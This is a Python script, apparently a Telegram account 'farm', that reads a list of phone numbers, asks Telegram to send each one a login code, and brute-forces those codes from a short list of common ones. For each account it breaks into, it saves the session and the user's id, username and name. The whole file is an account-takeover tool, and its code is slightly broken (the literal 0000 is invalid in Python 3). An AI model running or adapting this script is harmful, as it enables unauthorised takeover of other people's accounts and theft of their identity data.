import asyncio
import os
import json
from pyrogram import Client
from pyrogram.errors import PhoneCodeInvalid, PhoneCodeExpired, FloodWait
from config import API_ID, API_HASH

SESSION_DIR = "sessions"
DELAY_BETWEEN = 30
COMMON_OTPS = [1234, 12345, 1111, 0000, 123456, 111111]

os.makedirs(SESSION_DIR, exist_ok=True)

def load_phones():
    if not os.path.exists("free_data/free_phones.txt"):
        return []
    with open("free_data/free_phones.txt", "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

async def try_otp(app, phone, phone_hash):
    for otp in COMMON_OTPS:
        try:
            await app.sign_in(phone, phone_hash, str(otp))
            return True
        except PhoneCodeInvalid:
            continue
    return False

async def create_session(phone):
    session_name = f"{SESSION_DIR}/session_{phone.replace('+','')}"
    async with Client(session_name, API_ID, API_HASH, workdir=".") as app:
        try:
            sent = await app.send_code(phone)
            if await try_otp(app, phone, sent.phone_code_hash):
                me = await app.get_me()
                data = {
                    "phone": phone,
                    "user_id": me.id,
                    "username": me.username or "",
                    "first_name": me.first_name or ""
                }
                with open(f"{session_name}.json", "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
                print(f"✅ {phone} → @{me.username or me.first_name}")
                return True
        except FloodWait as e:
            print(f"⏳ {phone}: флуд, ждём {e.x} сек")
            await asyncio.sleep(e.x)
        except Exception as e:
            print(f"❌ {phone}: {e}")
    return False

async def farm(count=10):
    phones = load_phones()
    if not phones:
        print("❌ Нет номеров. Сначала выполни /generate_phones")
        return
    
    print(f"🚜 Ферма запущена: {count} попыток")
    for i, phone in enumerate(phones[:count]):
        print(f"\n👉 {i+1}/{count}: {phone}")
        await create_session(phone)
        await asyncio.sleep(DELAY_BETWEEN)

if __name__ == "__main__":
    import sys
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    asyncio.run(farm(count))